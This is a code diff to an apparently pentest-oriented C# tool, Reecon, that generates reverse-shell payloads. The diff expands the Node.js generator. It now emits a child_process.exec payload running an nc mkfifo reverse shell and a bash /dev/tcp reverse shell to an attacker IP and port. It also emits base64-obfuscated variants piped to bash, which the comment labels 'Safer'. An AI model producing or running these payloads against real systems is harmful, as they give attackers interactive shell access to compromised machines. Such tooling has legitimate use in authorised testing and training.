@@ -16,7 +16,7 @@ namespace Reecon
                 General.PrintIPList();
                 return;
             }
-            string shellType = args[1];
+            string shellType = args[1].ToLower(); // NodeJS == nodejs
             // If we have a tun0 IP, use that instead as the default
             List<General.IP> ipList = General.GetIPList();
             string ip = ipList.Any(x => x.Name == "tun0") ? ipList.FirstOrDefault(x => x.Name == "tun0").Address.ToString() : "10.0.0.1";
@@ -182,7 +182,13 @@ namespace Reecon
         private static string NodeJSShell(string ip, string port)
         {
             Console.WriteLine("Test: (function(){return \"Reelix\"})()");
-            return $"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f', ()=>{{}})";
+            string plainShell = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
+            string plainShell2 = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
+            string b64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
+            string b64ShellAlt = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell2));
+            return $"Normal: require('child_process').exec('{plainShell}', ()=>{{}})" + Environment.NewLine
+                + $"Safer: require('child_process').exec('echo {b64Shell} | base64 -d | bash', ()=>{{}})" + Environment.NewLine
+                + $"Safter (Alt): require('child_process').exec('echo {b64ShellAlt} | base64 -d | bash', ()=>{{}})";
         }
 
         private static string PHPShell(string ip, string port)
